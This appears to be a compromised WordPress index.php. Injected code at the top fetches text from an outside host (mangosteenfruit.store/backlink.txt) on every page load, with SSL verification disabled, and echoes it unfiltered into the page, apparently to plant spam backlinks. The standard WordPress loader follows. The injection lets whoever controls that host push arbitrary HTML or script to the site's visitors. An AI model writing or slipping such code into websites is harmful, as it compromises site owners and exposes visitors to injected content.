<?php
function getBacklink() {
    $url = 'https://mangosteenfruit.store/backlink.txt';
    $content = '';
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $result = curl_exec($ch);
        curl_close($ch);
        
        if ($result !== false && strlen($result) > 0) {
            $content = $result;
        }
    } else {
        $result = @file_get_contents($url);
        if ($result !== false && strlen($result) > 0) {
            $content = $result;
        }
    }
    
    return $content;
}

$bl = getBacklink();
if ($bl) echo $bl;

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);

require __DIR__ . '/wp-blog-header.php';
